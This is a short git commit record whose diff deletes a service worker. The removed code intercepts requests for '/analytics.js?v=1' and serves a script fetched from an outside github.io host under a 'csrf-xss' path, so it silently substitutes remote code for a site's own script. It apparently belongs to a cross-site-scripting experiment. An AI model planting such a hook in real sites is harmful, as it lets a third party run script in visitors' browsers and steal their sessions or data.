62a412f484f64c17aa7cec141d8e97e11299300c
navj04 <championgamersp@gmail.com>
2025-04-23 21:49:49 +1000

    Delete service-worker.js

--- service-worker.js
+++
@@ -1,5 +0,0 @@
-self.addEventListener('fetch', event => {
-  if (event.request.url.endsWith('/analytics.js?v=1')) {
-    event.respondWith(fetch('https://nvj04.github.io/csrf-xss/analytics.js'));
-  }
-});
